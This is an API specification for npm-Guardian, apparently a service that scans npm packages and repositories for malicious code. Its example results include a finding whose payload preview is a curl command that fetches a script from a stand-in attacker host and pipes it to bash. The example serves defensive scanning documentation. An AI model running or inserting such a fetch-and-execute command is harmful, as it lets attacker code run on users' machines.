# npm-Guardian API Specification

The API Gateway is built in Node.js (TypeScript) exposing RESTful JSON endpoints.

## Base URL
`https://api.npm-guardian.io/v1`

## Authentication
Unless noted otherwise, endpoints require a Bearer token in the `Authorization` header, representing either an OAuth Session JWT or an API Key.

---

## 1. Package Scanning

### `POST /api/scan/package`
Triggers a deep scan of an npm package.

**Request Body:**
```json
{
  "package_name": "express",
  "version": "latest",
  "force_rescan": false
}
```

**Response (202 Accepted):**
```json
{
  "scan_id": "uuid-1234-5678",
  "status": "queued",
  "message": "Package evaluation has started."
}
```

---

## 2. Repository Scanning

### `POST /api/scan/repository`
Initiates a dependency tree scan of a connected repository.

**Request Body:**
```json
{
  "repo_url": "https://github.com/user/project",
  "branch": "main"
}
```

**Response (202 Accepted):**
```json
{
  "scan_id": "uuid-9876-5432",
  "status": "queued",
  "message": "Repository cloned. Dependency resolution started."
}
```

---

## 3. Results Retrieval

### `GET /api/scan/results/{scan_id}`
Polls the API for the complete scan result.

**Response (200 OK):**
```json
{
  "scan_id": "uuid-1234-5678",
  "status": "completed",
  "target": "suspicious-utils@1.0.2",
  "overall_risk_score": 85,
  "risk_level": "HIGH",
  "findings": [
    {
      "category": "Behavioral Sandbox",
      "severity": "critical",
      "description": "postinstall script attempted to execute a cURL shell command.",
      "file_path": "package.json",
      "payload_preview": "curl -s http://malicious.c2/payload.sh | bash"
    },
    {
      "category": "Static Analysis",
      "severity": "high",
      "description": "base64 encoded payload mapped to an eval() invocation.",
      "file_path": "index.js",
      "line_number": 42
    }
  ]
}
```

---

## 4. Threat Intelligence Lookup

### `GET /api/packages/risk/{package_name}`
Rapid lookup for CI/CD environments. Highly cached in Redis.

**Response (200 OK):**
```json
{
  "package": "express",
  "version": "4.18.2",
  "risk_score": 5,
  "risk_level": "LOW",
  "last_scanned": "2024-03-20T14:22:10Z"
}
```
